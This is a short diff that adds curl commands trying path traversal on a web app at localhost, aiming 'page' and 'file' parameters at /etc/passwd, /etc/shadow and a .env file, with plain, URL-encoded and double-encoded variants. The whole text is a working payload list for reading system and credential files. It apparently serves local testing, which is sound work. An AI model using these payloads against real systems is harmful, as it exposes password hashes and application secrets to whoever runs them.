@@ -1,2 +1,11 @@
+# reach random files
 curl -sk "https://localhost/?page=../../../../etc/passwd"
 curl -sk "https://localhost/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow"
+
+# reach env
+curl -sk "https://localhost/?file=../../../../.env"
+
+# encoded variants
+curl -sk "https://localhost/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f.env"
+curl -sk "https://localhost/?file=%252e%252e%252f%252e%252e%252f.env"
+
